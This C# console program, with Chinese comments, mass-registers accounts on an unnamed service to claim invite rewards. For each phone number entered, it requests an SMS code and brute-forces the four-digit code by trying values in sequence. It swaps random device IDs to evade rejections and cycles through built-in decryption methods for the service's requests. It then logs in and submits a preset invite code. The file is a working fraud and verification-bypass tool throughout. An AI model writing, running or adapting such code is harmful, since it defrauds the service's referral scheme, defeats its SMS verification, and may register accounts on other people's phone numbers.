using Newtonsoft.Json;
using System;
using System.IO;
using System.Linq;
using System.Text;


//如需配置（），可去Register.cs文件
namespace ConsoleApp1
{
    internal class Program
    {
        private static int n = 0;//记录成功数量

        private static int m= 0;//记录解密验证码的方法是第几个
        static void Main(string[] args)
        {
            Console.Write("请输入手机号，多个请用英文逗号隔开：");
            Stream steam = Console.OpenStandardInput();
            Console.SetIn(new StreamReader(steam, Encoding.Default, false, 5000));
            string phones1 = Console.ReadLine();
            string[] phones2 = phones1.Split(',');
            //开始循环手机号
            foreach (string phone in phones2)
            {
                Register.appid = myUtil.get32str();//使用随机设备id
                m = 0;//默认使用第一个解密方法
                do1(phone);
            }
            Console.Write("程序运行结束。成功邀请了"+n+"个新用户。");
            NoExit.exit1();
        }

  
        static void do1(string phone)
        {
            Console.WriteLine("--------------------------------");
            Console.WriteLine("尝试注册新用户，手机号："+ phone);
            string registerresult = Register.isregister(phone);//验证是否被注册
            while (registerresult.Contains("409"))//如果验证请求不能正常发出，可能是设备id不可用，换其他的直到可用为止
            {
               Register.appid = myUtil.get32str();//更换随机设备id
               registerresult = Register.isregister(phone);//再尝试验证手机号是否注册
            }
            dynamic registerjson = JsonConvert.DeserializeObject(registerresult);
            string isregister1 = registerjson.isRegister;
            if (isregister1 == "0")//此时该手机号未被注册，可用
            {
                string sendcodeResult = Register.sendCode(phone);//尝试发送验证码

                //定义1个a，用来判断尝试发送验证码不超过10次
                int a = 0;
                while (sendcodeResult != "200")
                {
                    a++;
                    sendcodeResult = Register.sendCode(phone);
                    if (a == 10) { break; }
                }
                if (a == 10)
                {
                    Console.WriteLine("验证码发送失败，此账号1分钟内发过验证码");
                    return;
                }

                Console.WriteLine("验证码发送成功。");
                Console.WriteLine("正在攻击服务器，暴力破解验证码，");
                Console.WriteLine("请保持网络畅通，耐心等待5分钟。。。。");
                int[] codes = Enumerable.Range(4000, 5900).ToArray();//设置验证码的范围，4位数字，从4000开始按顺序尝试
                foreach (int code in codes)
                {
                    string nonce = code.ToString();
                    string result = Register.doMRegis(phone, nonce, m);//尝试使用循环到的该验证码注册
                    while (result.Contains("409"))//当结果包含409，说明解密失败，需要更换解密方法
                    {
                        m++;
                        result = Register.doMRegis(phone, nonce, m);
                        if (m > 3)//本程序内置了4个解密方法，逐个尝试
                        {
                            m = 0;
                            break;
                        }
                        
                    }
                    Console.WriteLine("尝试使用验证码:" + nonce + "," + result);
                    if (result.Contains("409"))//当本程序解密方法用完，但仍无法解密时，换下一个手机号
                    {
                        Console.WriteLine("本次自动生成的随机设备id解密失败，跳过该手机号。");
                        break;//结束当前的发验证码循环
                    }
                   else
                   if (result.Contains("失效"))//当超过5分钟仍未成功，验证码到期，需要重新发送验证码并重新尝试
                    {
                        Console.WriteLine("验证码已过期,重新发送验证码");
                        do1(phone);//重新开始流程
                        break;//结束当前的发验证码循环
                    }
                    else if (result.Contains("200"))//验证码撞库成功
                    {
                        Console.WriteLine("已使用预设密码注册成功。");
                        string userid = Register.dologin(phone);//尝试登陆该账户
                        Console.WriteLine("已成功登录该账号！" +phone+":"+ userid);

                        //开始尝试填写邀请码
                        int v = 0;//邀请码解密方法，表示第几个
                        string InviteCoderesult= Register.setInviteCode(userid, v);
                        if (InviteCoderesult.Contains("200"))
                        {
                            Console.WriteLine("已成功填写预设邀请码。");
                            n++;
                        }
                        while (!InviteCoderesult.Contains("200"))//当第一个解密方法失败时，换下一个解密方法
                        {
                            v++;
                            InviteCoderesult=Register.setInviteCode(userid, v);
                            if (InviteCoderesult.Contains("200"))//邀请成功
                            {
                                Console.WriteLine("已成功填写预设邀请码。");
                                n++;//计数，用来计算本次运行成功几个
                                break;
                            }
                            if (v>8)//本程序内置9个解密方法，如果都试过不行，跳过该手机号
                            {
                                Console.WriteLine("邀请失败，因为遇到了新的加密算法。");
                                break;

                            }
                        }
                       
                        break;//结束发验证码循环
                    }
                }
            }
            else
            {
                Console.WriteLine("该手机号已被注册。");
            }

        }    
        
    }
}
